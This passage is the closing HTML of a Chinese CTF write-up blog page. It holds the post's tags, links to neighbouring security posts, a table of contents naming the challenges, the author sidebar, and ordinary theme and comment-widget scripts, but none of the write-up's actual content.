href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><footer class="post-footer"><div class="post-tags"><a href="/tags/CTF/" rel="tag"># CTF</a></div><div class="post-nav"><div class="post-nav-item"><a href="/archives/e11628b6.html" rel="prev" title="PHP利用Math函数RCE总结"><i class="fa fa-chevron-left"></i> PHP利用Math函数RCE总结</a></div><div class="post-nav-item"><a href="/archives/15015253.html" rel="next" title="MongoDB 注入初识">MongoDB 注入初识 <i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc">文章目录</li><li class="sidebar-nav-overview">站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">2.</span> <span class="nav-text">题解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cyberwall"><span class="nav-number">2.1.</span> <span class="nav-text">Cyberwall</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Wheels-n-Whales"><span class="nav-number">2.2.</span> <span class="nav-text">Wheels n Whales</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRegex"><span class="nav-number">2.3.</span> <span class="nav-text">CSRegex</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#imghost"><span class="nav-number">2.4.</span> <span class="nav-text">imghost</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Secure-Secret-Sharing"><span class="nav-number">3.</span> <span class="nav-text">Secure Secret Sharing</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E8%AE%B0"><span class="nav-number">4.</span> <span class="nav-text">后记</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="landvsec" src="/images/landv.jpg"><p class="site-author-name" itemprop="name">landvsec</p><div class="site-description" itemprop="description">困于山中，被鬼追逐。</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">8</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">3</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">9</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/landvsec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;landvsec" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i></a> </span><span class="links-of-author-item"><a href="mailto:landv.sec@outlook.com" title="E-Mail → mailto:landv.sec@outlook.com" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i></a> </span><span class="links-of-author-item"><a href="https://twitter.com/landvsec" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;landvsec" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-fw fa-twitter"></i></a></span></div></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2020</span> <span class="with-love"><i class="fa fa-user"></i> </span><span class="author" itemprop="copyrightHolder">landvsec</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-area-chart"></i> </span><span title="站点总字数">65k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span title="站点阅读时长">59 分钟</span></div><div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Gemini</a> v7.7.2</div></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/local-search.js"></script><script>NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '0yViUOGA7HtJMAXySVB4izzL-gzGzoHsz',
      appKey     : 'j8ykiSEAw39cFwbk9Hrh2hQP',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});</script></body></html>